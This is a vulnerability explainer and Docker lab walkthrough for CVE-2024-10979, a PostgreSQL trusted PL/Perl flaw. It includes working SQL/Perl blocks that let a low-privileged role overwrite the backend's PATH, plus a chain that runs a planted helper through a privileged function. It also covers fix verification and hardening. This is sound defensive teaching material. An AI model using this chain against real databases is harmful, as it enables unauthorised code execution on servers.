## The short version

**CVE-2024-10979** affects PostgreSQL's trusted **PL/Perl** language. Before the fix, code running through trusted PL/Perl could modify the database backend's process environment through Perl's `%ENV` hash.

That breaks an important security boundary: trusted PL/Perl is meant to execute database-side logic without giving the function access to operating-system capabilities. Environment variables such as `PATH` can nevertheless influence later program loading or other process behaviour. In the right deployment, that primitive can lead to arbitrary code execution.

This article demonstrates the vulnerable primitive in a disposable local lab. The first test changes `PATH`; an optional impact test then launches one fixed, harmless helper inside the container. It never accepts attacker-controlled command input and never targets the host or a production system.

> **Lab safety:** run these commands only against a local, disposable PostgreSQL instance that you own. Do not test this technique against a production database or a third-party system.

## At a glance

| Field | Details |
| --- | --- |
| Affected component | PostgreSQL trusted PL/Perl |
| Attack precondition | A database role with `USAGE` on the `plperl` language |
| Impact | Mutation of the PostgreSQL backend process environment |
| Severity | High — CVSS 3.0: 8.8 |
| Affected releases | Before 17.1, 16.5, 15.9, 14.14, 13.17 and 12.21 |
| Fixed releases | 17.1, 16.5, 15.9, 14.14, 13.17 and 12.21 |

The official PostgreSQL advisory describes the flaw as an environment-variable issue in PL/Perl that can allow arbitrary code execution even when the attacker does not have an operating-system account. See the [PostgreSQL security advisory](https://www.postgresql.org/support/security/CVE-2024-10979/).

## Why trusted PL/Perl matters

PostgreSQL supports procedural languages for stored functions and anonymous `DO` blocks. PL/Perl comes in two forms:

- **Trusted PL/Perl** (`plperl`) is intended to run inside a restricted interpreter.
- **Untrusted PL/Perl** (`plperlu`) is deliberately more powerful and is normally restricted to superusers.

The vulnerability concerns **trusted** PL/Perl. Before the fix, `%ENV` retained its connection to the operating-system environment of the PostgreSQL backend. A role that could use the language could therefore perform an operation that the trusted interpreter was supposed to prevent:

```perl
$ENV{PATH} = "/some/attacker-controlled/directory";
```

The lab below changes `PATH` to a directory that contains one harmless proof helper. The goal is to show both the process-environment mutation and its possible impact, without turning the example into a general-purpose command-execution chain.

## The attack scenario

The scenario is deliberately small:

1. An attacker obtains a low-privileged PostgreSQL account, for example through an application connection or an overly broad database grant.
2. That role has `USAGE` on the `plperl` language. PostgreSQL's default language privileges have historically made this easy to overlook.
3. The attacker submits an anonymous PL/Perl block.
4. The block writes to `%ENV`, changing the environment of the PostgreSQL backend process.
5. A later environment-dependent operation may interpret the modified value in a more privileged context.

The exact path from environment mutation to code execution depends on the surrounding deployment. This is why the demonstration focuses on the vulnerable primitive instead of claiming that every PostgreSQL installation is immediately an RCE target.

## Building the lab

Use an affected PostgreSQL release for the first run. PostgreSQL 16.4 is a convenient example:

```bash
docker run --rm --name cve-2024-10979-lab \
  -e POSTGRES_PASSWORD=labpass \
  -e POSTGRES_DB=cve10979_lab \
  -p 127.0.0.1:55432:5432 \
  postgres:16.4
```

The server must include the PL/Perl extension. Depending on the image or distribution, PL/Perl is shipped as a separate package. Install the package matching the PostgreSQL server version, or use a PostgreSQL build compiled with PL/Perl support. Do not mix a current fixed PL/Perl package into the vulnerable run.

Connect as the lab administrator:

```bash
psql "host=127.0.0.1 port=55432 dbname=cve10979_lab user=postgres password=labpass"
```

Install PL/Perl and create a deliberately limited database role:

```sql
CREATE EXTENSION plperl;

CREATE ROLE lab_attacker
  LOGIN
  PASSWORD 'lab-only-password'
  NOSUPERUSER
  NOCREATEDB
  NOCREATEROLE;

GRANT CONNECT ON DATABASE cve10979_lab TO lab_attacker;
GRANT USAGE ON LANGUAGE plperl TO lab_attacker;
```

The important point is that `lab_attacker` is not a PostgreSQL superuser. The role only receives access to the database and usage of the trusted language.

## Demonstrating the vulnerable behaviour

Open a second session as `lab_attacker`:

```bash
psql "host=127.0.0.1 port=55432 dbname=cve10979_lab user=lab_attacker password=lab-only-password"
```

First, verify the identity and the language privilege:

```sql
SELECT current_user, current_setting('server_version');
SELECT has_language_privilege(current_user, 'plperl', 'USAGE');
```

The following anonymous block reads `PATH`, changes it to a non-existent directory and reads it back:

```sql
DO $$
my $before = exists $ENV{PATH} ? $ENV{PATH} : '<unset>';
$ENV{PATH} = '/tmp/cve-2024-10979-path';
my $after = exists $ENV{PATH} ? $ENV{PATH} : '<unset>';
elog(NOTICE, "before=$before after=$after");
$$ LANGUAGE plperl;
```

On an affected release, the server accepts the assignment and reports a changed value. The initial value depends on the container image:

```text
NOTICE:  before=<original PATH> after=/tmp/cve-2024-10979-path
```

Run a second block in the same session:

```sql
DO $$
my $value = exists $ENV{PATH} ? $ENV{PATH} : '<unset>';
elog(NOTICE, "observed=$value");
$$ LANGUAGE plperl;
```

Expected result on the vulnerable build:

```text
NOTICE:  observed=/tmp/cve-2024-10979-path
```

This proves the first part of the security boundary failure: a low-privileged database role has changed `PATH` in the PostgreSQL backend process environment through trusted PL/Perl.

## Demonstrating command execution through `PATH`

The previous test proves that the backend environment can be modified. The following optional step demonstrates why that matters: a later privileged operation in the **same backend process** can resolve a command through the modified `PATH`.

This is a laboratory-only construction. The privileged function is intentionally created by the administrator, the command name is hard-coded, and the helper only writes a marker file inside the disposable container. It is not a pattern to deploy in an application.

### 1. Create a harmless helper inside the container

Run this from a POSIX shell on the host. The helper is deliberately named `postgresql-backend-command-proof` to make its purpose explicit:

```bash
docker exec -i cve-2024-10979-lab sh <<'EOF'
mkdir -p /tmp/cve-2024-10979-path
cat > /tmp/cve-2024-10979-path/postgresql-backend-command-proof <<'SCRIPT'
#!/bin/sh
printf '%s\n' 'command executed by the PostgreSQL backend' \
  > /tmp/cve-2024-10979-proof.txt
SCRIPT
chmod 700 /tmp/cve-2024-10979-path/postgresql-backend-command-proof
EOF
```

The helper directory is not part of the normal container `PATH`. It will only be found after the vulnerable PL/Perl block replaces `PATH`.

### 2. Create a deliberately privileged lab function

In the administrator `psql` session, create a `plperlu` function that invokes only the fixed helper name, then grant execution to the low-privileged role:

```sql
CREATE FUNCTION public.run_path_probe()
RETURNS text
LANGUAGE plperlu
SECURITY DEFINER
SET search_path = pg_catalog, pg_temp
AS $$
my $status = system('postgresql-backend-command-proof');
return $status == 0
  ? 'command executed (status=0)'
  : "command lookup failed (status=$status)";
$$;

REVOKE ALL ON FUNCTION public.run_path_probe() FROM PUBLIC;
GRANT EXECUTE ON FUNCTION public.run_path_probe() TO lab_attacker;
```

The function is owned by the administrator because it is created in the administrator session. `plperlu` is used only to model a later privileged operation that is allowed to invoke an operating-system command. The vulnerable primitive itself is still the trusted `plperl` `%ENV` mutation.

### 3. Invoke it from the same low-privileged session

Keep the previous `psql` session open as `lab_attacker`. The `DO` block and the `SELECT` must use the same connection, because the environment belongs to the PostgreSQL backend process serving that connection:

```sql
DO $$
my $before = exists $ENV{PATH} ? $ENV{PATH} : '<unset>';
$ENV{PATH} = '/tmp/cve-2024-10979-path';
my $after = exists $ENV{PATH} ? $ENV{PATH} : '<unset>';
elog(NOTICE, "before=$before after=$after");
$$ LANGUAGE plperl;

SELECT public.run_path_probe();
```

On an affected release, the command is found through the modified `PATH` and runs as the PostgreSQL service account inside the container:

```text
NOTICE:  before=<original PATH> after=/tmp/cve-2024-10979-path
           run_path_probe
--------------------------------------
 command executed (status=0)
```

Verify the harmless side effect from the host:

```bash
docker exec cve-2024-10979-lab \
  cat /tmp/cve-2024-10979-proof.txt
```

Expected output:

```text
command executed by the PostgreSQL backend
```

This does not mean that every vulnerable PostgreSQL deployment automatically exposes the same command. It demonstrates the security consequence described by PostgreSQL: a trusted PL/Perl environment mutation can become code execution when a later operation relies on process environment variables.

## Verifying the fix

Stop the disposable container and repeat the lab with a fixed release, for example PostgreSQL 16.5:

```bash
docker rm -f cve-2024-10979-lab

docker run --rm --name cve-2024-10979-lab \
  -e POSTGRES_PASSWORD=labpass \
  -e POSTGRES_DB=cve10979_lab \
  -p 127.0.0.1:55432:5432 \
  postgres:16.5
```

After recreating the extension and the lab role, run the same PL/Perl block. The corrected implementation replaces the process-backed `%ENV` with a protected hash. The attempted write is rejected with a warning, and `PATH` remains unchanged:

```text
WARNING:  attempted alteration of $ENV{PATH}
NOTICE:  before=<original PATH> after=<original PATH>
NOTICE:  observed=<original PATH>
```

This behaviour matches the regression test added by the PostgreSQL project in the [security fix commit](https://github.com/postgres/postgres/commit/3ebcfa54db3309651d8f1d3be6451a8449f6c6ec): attempted mutations are warned about and do not reach the process environment.

## Mitigation and hardening

### 1. Upgrade PostgreSQL

Upgrade to a release containing the fix:

- PostgreSQL 17.1 or later
- PostgreSQL 16.5 or later
- PostgreSQL 15.9 or later
- PostgreSQL 14.14 or later
- PostgreSQL 13.17 or later
- PostgreSQL 12.21 or later

The exact package version may use a vendor-specific suffix, so check the distribution's security advisory as well as `SELECT version();`.

### 2. Reduce PL/Perl exposure

If trusted PL/Perl is not required, remove the extension from databases that do not use it. Otherwise, restrict language usage and schema creation:

```sql
REVOKE USAGE ON LANGUAGE plperl FROM PUBLIC;
REVOKE CREATE ON SCHEMA public FROM PUBLIC;
```

These controls are defence in depth. They do not replace the PostgreSQL update and do not automatically remove functions that already exist.

### 3. Audit existing PL/Perl functions

Review functions written in either trusted or untrusted PL/Perl:

```sql
SELECT
  n.nspname AS schema_name,
  p.proname AS function_name,
  l.lanname AS language,
  pg_get_userbyid(p.proowner) AS owner
FROM pg_proc AS p
JOIN pg_namespace AS n ON n.oid = p.pronamespace
JOIN pg_language AS l ON l.oid = p.prolang
WHERE l.lanname IN ('plperl', 'plperlu')
ORDER BY n.nspname, p.proname;
```

Inspect any function that writes to `%ENV`, uses environment-dependent libraries or is owned by an unexpected role. Remove unused functions and review their `EXECUTE` privileges.

## Takeaways

CVE-2024-10979 is not a generic unauthenticated PostgreSQL remote-code-execution bug. It is a privilege-boundary failure involving trusted PL/Perl: an attacker still needs database access and language usage, but not a PostgreSQL superuser or an operating-system account.

The practical lesson is broader than this CVE. A language described as *trusted* must not expose process-global state or other operations that can influence a more privileged execution path. Upgrading is the primary fix; restricting language and schema privileges limits the blast radius while upgrades are being coordinated.
